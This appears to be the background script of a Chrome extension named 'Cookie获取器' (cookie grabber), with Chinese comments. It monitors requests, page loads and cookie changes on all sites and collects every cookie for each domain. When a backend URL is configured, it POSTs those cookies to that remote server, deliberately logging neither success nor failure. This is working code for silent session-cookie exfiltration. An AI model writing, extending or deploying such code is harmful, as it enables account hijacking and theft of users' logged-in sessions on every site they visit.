// 记录服务工作线程启动
console.log('Cookie获取器 - 后台服务已启动');

// 存储后台配置
let backendConfig = null;

// 存储请求相关信息
let requestMap = new Map();

// 加载后台配置
loadBackendConfig();

// 获取当前标签页的域名
function getDomainFromUrl(url) {
    try {
      // 处理带端口号的域名（如localhost:8080）
      if (url.includes('://localhost')) {
        return 'localhost';
      }
      
      // 使用URL API解析
      const urlObj = new URL(url);
      let hostname = urlObj.hostname;
      
      // 处理IPv6地址（如[::1]）
      if (hostname.startsWith('[') && hostname.endsWith(']')) {
        hostname = hostname.slice(1, -1);
      }
      
      // 移除www前缀
      return hostname.replace(/^www\./, '');
    } catch (e) {
      // 增强正则匹配
      const domainMatch = url.match(/^(?:https?:\/\/)?(?:[^@\n]+@)?(?:www\.)?([^:\/\n?]+)/i);
      return domainMatch ? domainMatch[1] : '';
    }
  }
  

// 加载后台配置
function loadBackendConfig() {
  chrome.storage.local.get(['backendConfig'], function(result) {
    if (chrome.runtime.lastError) {
      console.error('加载后台配置时出错:', chrome.runtime.lastError.message);
      return;
    }
    
    backendConfig = result.backendConfig || {
      enabled: false,
      url: '',
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      dataFormat: '{"domain": "{domain}", "cookies": {cookies}}',
      urlFilters: [],
      urlFilterUseRegex: false,
      cookieKeyFilters: [],
      cookieFilterExcludeMode: false
    };
    
    console.log('后台传输状态:', backendConfig.enabled ? '已启用' : '已禁用');
    if (backendConfig.enabled) {
      console.log('后台URL:', backendConfig.url);
    }
  });
}

// 检查URL是否匹配过滤器
function isUrlMatched(url) {
  // 如果没有配置URL过滤器，则所有URL都匹配
  if (!backendConfig.urlFilters || backendConfig.urlFilters.length === 0) {
    return true;
  }
  
  // 使用正则表达式匹配
  if (backendConfig.urlFilterUseRegex) {
    return backendConfig.urlFilters.some(pattern => {
      try {
        const regex = new RegExp(pattern);
        return regex.test(url);
      } catch (e) {
        return false;
      }
    });
  } 
  // 使用包含匹配
  else {
    return backendConfig.urlFilters.some(pattern => url.includes(pattern));
  }
}

// 过滤Cookie
function filterCookies(cookies) {
  // 如果没有配置Cookie键过滤器，则返回所有Cookie
  if (!backendConfig.cookieKeyFilters || backendConfig.cookieKeyFilters.length === 0) {
    return cookies;
  }
  
  // 排除模式
  if (backendConfig.cookieFilterExcludeMode) {
    return cookies.filter(cookie => !backendConfig.cookieKeyFilters.includes(cookie.name));
  } 
  // 包含模式
  else {
    return cookies.filter(cookie => backendConfig.cookieKeyFilters.includes(cookie.name));
  }
}

// 向后台发送Cookie数据
function sendCookiesToBackend(domain, cookies) {
  if (!backendConfig || !backendConfig.enabled || !backendConfig.url) {
    return;
  }
  
  // 如果域名为空，不发送
  if (!domain) {
    return;
  }
  
  // 检查URL是否匹配过滤器
  if (!isUrlMatched(domain)) {
    return;
  }
  
  // 过滤Cookie
  const filteredCookies = filterCookies(cookies);
  
  // 如果过滤后没有Cookie，不发送
  if (filteredCookies.length === 0) {
    return;
  }
  
  try {
    // 格式化数据
    let formattedData = backendConfig.dataFormat
      .replace('{domain}', domain)
      .replace('{cookies}', JSON.stringify(filteredCookies));
    
    // 发送请求
    fetch(backendConfig.url, {
      method: backendConfig.method,
      headers: backendConfig.headers,
      body: formattedData
    })
    .then(response => {
      if (!response.ok) {
        throw new Error('HTTP错误，状态码: ' + response.status);
      }
      return response.text();
    })
    .then(data => {
      // 成功发送，不打印日志
    })
    .catch(error => {
      // 发送失败，不打印日志
    });
  } catch (error) {
    // 准备发送数据时出错，不打印日志
  }
}

// 监听网络请求开始
chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    if (details.tabId === -1) return; // 忽略非标签页请求
    
    const url = details.url;
    const domain = getDomainFromUrl(url);
    
    if (!domain || !url.startsWith('http')) return;
    
    // 记录请求开始时间
    requestMap.set(details.requestId, {
      domain: domain,
      url: url,
      tabId: details.tabId,
      timestamp: Date.now()
    });
  },
  { urls: ["<all_urls>"] }
);

// 监听网络请求完成
chrome.webRequest.onCompleted.addListener(
  (details) => {
    const requestInfo = requestMap.get(details.requestId);
    if (!requestInfo) return;
    
    // 清理请求映射
    requestMap.delete(details.requestId);
    
    const domain = requestInfo.domain;
    const tabId = requestInfo.tabId;
    
    if (!domain) return; // 如果域名为空，不处理
    
    // 获取当前域名下的所有cookie
    chrome.cookies.getAll({ domain: domain }, (cookies) => {
      if (cookies.length === 0) return;
      
      // 分类Cookie
      const firstPartyCookies = [];
      const thirdPartyCookies = [];
      
      cookies.forEach(cookie => {
        // 检查SameSite属性
        if (cookie.sameSite === 'no_restriction' || cookie.sameSite === 'none') {
          thirdPartyCookies.push(cookie);
        } else {
          firstPartyCookies.push(cookie);
        }
      });
      
      // 将cookie保存到本地存储
      chrome.storage.local.set({ 
        'current_domain': domain,
        'current_cookies': cookies,
        'first_party_cookies': firstPartyCookies,
        'third_party_cookies': thirdPartyCookies
      }, () => {
        // 向后台发送Cookie数据
        sendCookiesToBackend(domain, cookies);
        
        // 向content script发送消息
        try {
          chrome.tabs.sendMessage(tabId, { 
            action: 'cookiesUpdated',
            domain: domain
          }, (response) => {
            if (chrome.runtime.lastError) {
              // 忽略错误，content script可能尚未加载
            }
          });
        } catch (error) {
          // 忽略错误
        }
      });
    });
  },
  { urls: ["<all_urls>"] }
);

// 监听标签页更新事件
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  // 如果页面已完成加载
  if (changeInfo.status === 'complete' && tab.url) {
    const domain = getDomainFromUrl(tab.url);
    if (!domain) return;
    
    // 获取当前域名下的所有cookie
    chrome.cookies.getAll({ domain: domain }, (cookies) => {
      // 分类Cookie
      const firstPartyCookies = [];
      const thirdPartyCookies = [];
      
      cookies.forEach(cookie => {
        // 检查SameSite属性
        if (cookie.sameSite === 'no_restriction' || cookie.sameSite === 'none') {
          thirdPartyCookies.push(cookie);
        } else {
          firstPartyCookies.push(cookie);
        }
      });
      
      // 将cookie保存到本地存储
      chrome.storage.local.set({ 
        'current_domain': domain,
        'current_cookies': cookies,
        'first_party_cookies': firstPartyCookies,
        'third_party_cookies': thirdPartyCookies
      }, () => {
        // 向后台发送Cookie数据
        sendCookiesToBackend(domain, cookies);
        
        // 向content script发送消息
        try {
          chrome.tabs.sendMessage(tabId, { 
            action: 'cookiesUpdated',
            domain: domain
          }, (response) => {
            if (chrome.runtime.lastError) {
              // 忽略错误，content script可能尚未加载
            }
          });
        } catch (error) {
          // 忽略错误
        }
      });
    });
  }
});

// 监听Cookie变化事件
chrome.cookies.onChanged.addListener((changeInfo) => {
  const cookie = changeInfo.cookie;
  const domain = cookie.domain.startsWith('.') ? cookie.domain.substring(1) : cookie.domain;
  const removed = changeInfo.removed;
  
  // 获取当前活动标签页
  chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
    if (tabs.length === 0) return;
    
    const currentTab = tabs[0];
    const currentDomain = getDomainFromUrl(currentTab.url);
    
    // 如果Cookie变化的域名与当前标签页域名匹配
    if (currentDomain && (currentDomain === domain || currentDomain.endsWith('.' + domain) || domain.endsWith('.' + currentDomain))) {
      // 重新获取所有Cookie
      chrome.cookies.getAll({ domain: currentDomain }, (cookies) => {
        // 分类Cookie
        const firstPartyCookies = [];
        const thirdPartyCookies = [];
        
        cookies.forEach(cookie => {
          if (cookie.sameSite === 'no_restriction' || cookie.sameSite === 'none') {
            thirdPartyCookies.push(cookie);
          } else {
            firstPartyCookies.push(cookie);
          }
        });
        
        // 更新存储
        chrome.storage.local.set({ 
          'current_domain': currentDomain,
          'current_cookies': cookies,
          'first_party_cookies': firstPartyCookies,
          'third_party_cookies': thirdPartyCookies
        }, () => {
          // 向后台发送Cookie数据
          sendCookiesToBackend(currentDomain, cookies);
          
          // 通知当前标签页
          if (currentTab.id) {
            try {
              chrome.tabs.sendMessage(currentTab.id, { 
                action: 'cookiesUpdated',
                domain: currentDomain
              });
            } catch (error) {
              // 忽略错误
            }
          }
        });
      });
    }
  });
});

// 监听来自popup或content script的消息
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'getCookies') {
    // 从存储中获取cookie
    chrome.storage.local.get(['current_domain', 'current_cookies', 'first_party_cookies', 'third_party_cookies'], (result) => {
      sendResponse({ 
        domain: result.current_domain || '',
        cookies: result.current_cookies || [],
        firstPartyCookies: result.first_party_cookies || [],
        thirdPartyCookies: result.third_party_cookies || []
      });
    });
    return true; // 异步响应
  } else if (request.action === 'getCurrentTabCookies') {
    // 获取当前标签页信息
    chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
      if (tabs.length === 0) {
        sendResponse({ error: '无法获取当前标签页信息' });
        return;
      }
      
      const currentTab = tabs[0];
      const domain = getDomainFromUrl(currentTab.url);
      
      if (!domain) {
        sendResponse({ error: '无法获取当前网站域名' });
        return;
      }
      
      // 获取当前域名下的所有cookie
      chrome.cookies.getAll({ domain: domain }, (cookies) => {
        // 分类Cookie
        const firstPartyCookies = [];
        const thirdPartyCookies = [];
        
        cookies.forEach(cookie => {
          if (cookie.sameSite === 'no_restriction' || cookie.sameSite === 'none') {
            thirdPartyCookies.push(cookie);
          } else {
            firstPartyCookies.push(cookie);
          }
        });
        
        // 保存到存储
        chrome.storage.local.set({ 
          'current_domain': domain,
          'current_cookies': cookies,
          'first_party_cookies': firstPartyCookies,
          'third_party_cookies': thirdPartyCookies
        }, () => {
          sendResponse({ 
            domain: domain,
            cookies: cookies,
            firstPartyCookies: firstPartyCookies,
            thirdPartyCookies: thirdPartyCookies
          });
        });
      });
      
      return true; // 异步响应
    });
    
    return true; // 异步响应
  } else if (request.action === 'reloadBackendConfig') {
    loadBackendConfig();
    sendResponse({ success: true });
  }
}); 